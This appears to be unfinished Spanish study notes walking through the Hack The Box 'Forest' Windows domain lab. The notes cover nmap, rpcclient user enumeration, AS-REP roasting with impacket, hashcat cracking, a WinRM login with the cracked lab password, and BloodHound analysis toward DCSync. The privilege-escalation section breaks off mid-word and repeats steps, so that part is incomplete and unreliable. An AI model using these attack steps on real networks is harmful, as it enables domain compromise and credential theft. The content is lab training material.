@@ -1,0 +1,232 @@
+10.129.95.210
+
+    1️⃣ Enumerar los puertos usando NMAP
+    
+        sudo nmap -sVC <IP máquina víctima> -Pn
+
+            PORT     STATE SERVICE      VERSION
+            53/tcp   open  domain       Simple DNS Plus
+            88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-11-04 20:29:45Z)
+            135/tcp  open  msrpc        Microsoft Windows RPC
+            139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+            389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+            445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+            464/tcp  open  kpasswd5?
+            593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+            636/tcp  open  tcpwrapped
+            3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+            3269/tcp open  tcpwrapped
+            5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+            |_http-title: Not Found
+            |_http-server-header: Microsoft-HTTPAPI/2.0
+            Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+            Host script results:
+            | smb2-security-mode: 
+            |   3.1.1: 
+            |_    Message signing enabled and required
+            | smb-security-mode: 
+            |   account_used: guest
+            |   authentication_level: user
+            |   challenge_response: supported
+            |_  message_signing: required
+            | smb-os-discovery: 
+            |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+            |   Computer name: FOREST
+            |   NetBIOS computer name: FOREST\x00
+            |   Domain name: htb.local
+            |   Forest name: htb.local
+            |   FQDN: FOREST.htb.local
+            |_  System time: 2026-11-04T12:29:53-08:00
+            |_clock-skew: mean: 2h46m49s, deviation: 4h37m11s, median: 6m47s
+            | smb2-time: 
+            |   date: 2026-11-04T20:29:49
+            |_  start_date: 2026-11-04T20:25:36
+
+
+    2️⃣ Revisando los puertos abiertos, se trata de un Active Directory.     
+    
+
+    3️⃣ Se usa crackmapexec para averiguar datos sobre el servidor DC
+
+        crackmapexec -U <IP máquina víctima>
+
+            SMB  10.129.95.210  445  FOREST  [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+
+
+    4️⃣ Ahora con la herramienta rcpclient se interactuará con sistemas Windows y servidores para enumerar de recursos
+    
+            rpcclient -U "" -N 10.129.95.210
+
+        Se enumera los usuarios con el comando "enumdomusers"
+
+            user:[Administrator] rid:[0x1f4]
+            user:[Guest] rid:[0x1f5]
+            user:[krbtgt] rid:[0x1f6]
+            user:[DefaultAccount] rid:[0x1f7]
+            user:[$331000-VK4ADACQNUCA] rid:[0x463]
+            user:[SM_2c8eef0a09b545acb] rid:[0x464]
+            user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+            user:[SM_75a538d3025e4db9a] rid:[0x466]
+            user:[SM_681f53d4942840e18] rid:[0x467]
+            user:[SM_1b41c9286325456bb] rid:[0x468]
+            user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+            user:[SM_7c96b981967141ebb] rid:[0x46a]
+            user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+            user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+            user:[HealthMailboxc3d7722] rid:[0x46e]
+            user:[HealthMailboxfc9daad] rid:[0x46f]
+            user:[HealthMailboxc0a90c9] rid:[0x470]
+            user:[HealthMailbox670628e] rid:[0x471]
+            user:[HealthMailbox968e74d] rid:[0x472]
+            user:[HealthMailbox6ded678] rid:[0x473]
+            user:[HealthMailbox83d6781] rid:[0x474]
+            user:[HealthMailboxfd87238] rid:[0x475]
+            user:[HealthMailboxb01ac64] rid:[0x476]
+            user:[HealthMailbox7108a4e] rid:[0x477]
+            user:[HealthMailbox0659cc1] rid:[0x478]
+            user:[sebastien] rid:[0x479]
+            user:[lucinda] rid:[0x47a]
+            user:[svc-alfresco] rid:[0x47b]
+            user:[andy] rid:[0x47e]
+            user:[mark] rid:[0x47f]
+            user:[santi] rid:[0x480]
+    
+
+    5️⃣ Ataque AS-REP-ROAST
+
+        Obtiene las credenciales de AD que tienen autorización Kerberos habilitada. 
+
+        Se usará el script "GetNPUsers.py" de la herramienta impacket. 
+
+            python3 ~/impacket/examples/GetNPUsers.py htb.local/ -no-pass -usersfile ~/Escritorio/Maquinas_HTB/Easy/Forest_Windows/user.txt -dc-ip <IP máquina víctima> 
+
+        Y nos devuelve un hash de la contraseña de un usuario, en este caso, de scv-alfresco. 
+    
+
+    6️⃣ Descubrir la contraseña hasheada con la herramienta hascat
+
+            hashcat hash.txt /usr/share/wordlists/rockyou.txt
+
+        La contraseña se encuentra después del hash (s3rvice)
+    
+
+    7️⃣ Comprobar si la contraseña es del usuario scv-alfresco con la herramienta crackmapexec
+    
+        crackmapexec smb <IP máquina víctima> -u svc-alfresco -p s3rvice
+
+            SMB   10.129.95.210   445   FOREST   [+] htb.local\svc-alfresco:s3rvice 
+
+
+    8️⃣ Comprobar si se puede acceder por winrm con las credenciales encontradas
+    
+        crackmapexec winrm <IP máquina víctima> -u svc-alfresco -p s3rvice
+        
+            WINRM   10.129.95.210   5985   FOREST   [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+
+
+    9️⃣ Conexión con el usuario encontrado usando la herramienta Evil-WinRM
+
+        evil-winrm -i <IP máquina víctima> -u svc-alfresco -p s3rvice
+        evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
+
+
+    1️⃣0️⃣ Obtener la user flag
+
+        C:\Users\svc-alfresco\Desktop\user.txt
+    
+
+    1️⃣2️⃣ Reconocimiento para obtener una escalada de privilegios
+
+        Se usará la herramienta BloodHound. Para ello, se usará SharpHound. 
+
+        Se encuentra en el directorio /usr/share/metasploit-framework/data/post/SharpHound.exe
+
+        Se sube a la terminal de la víctima con el siguiente comando: 
+
+            upload SharpHound.exe
+    
+
+    1️⃣3️⃣ Ejecutar el archivo que se acaba de subir
+
+        .\SharpHound.exe -c All
+
+            Si se hace un dir, se encuentra un fichero .zip
+
+
+    1️⃣4️⃣ Descargar el fichero .zip (el nombre del fichero cambia ya que se refiere a la fecha que se ejecuta)
+
+        download 20261104152400_BloodHound.zip
+
+
+    1️⃣5️⃣ Ejecutamos BloodHound
+
+        sudo bloodhound-start
+
+            user: admin
+            pass: admin
+
+
+    1️⃣6️⃣ Subimos el fichero a BloodHound
+
+
+    1️⃣7️⃣ Una vez subido, se explora como escalar privilegios al Administrador del Dominio 
+
+        ➡️ PASO 1: Marcar el usuario SVC-ALFRESCO como "Owned"
+
+            
+
+
+        ➡️ PASO 2: Marcar el usuario SVC-ALFRESCO como "Owned"
+
+
+
+
+
+
+
+
+
+
+            El usuario SVC-ALFRESCO pertenece a varios grupos. El camino que se trazará es el siguiente: 
+
+            · Membresías anidadas: El usuario hereda los privilegios del grupo "Account Operators" sin que se tenga que hacer nada.
+
+                SVC-ALFRESCO ·> SERVICE ACCOUNTS ·> PRIVILEGED IT ACCOUNTS ·> ACCOUNT OPERATORS 
+
+            · Permiso GenericAll: GenericAll es un control total, lo que permite añadir al usuario a ese grupo. 
+
+                ACCOUNT OPERATORS ·> permiso GenericAll sobre ·> EXCHANGE WINDOWS PERMISSIONS 
+
+            · Permiso WriteDacl: WriteDacl puede modificar la lista de control de acceso del dominio, lo que permite concedernos el permiso de DCSysc. 
+
+                EXCHANGE WINDOWS PERMISSIONS ·> permiso WriteDacl sobre ·> HTB.LOCAL
+
+            · DCSync: 
+
+                Con el permiso de DCSync, se puede simular el comportamiento de un DC para solicitar los hashes de contraseñas de todos los usuarios. 
+
+        
+        ➡️ An
+
+
+
+
+
+
+
+
+
+
+    1️⃣8️⃣ Subimos el fichero a BloodHound
+
+    1️⃣9️⃣ Subimos el fichero a BloodHound
+
+
+
+
+
+
+
+
+1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣
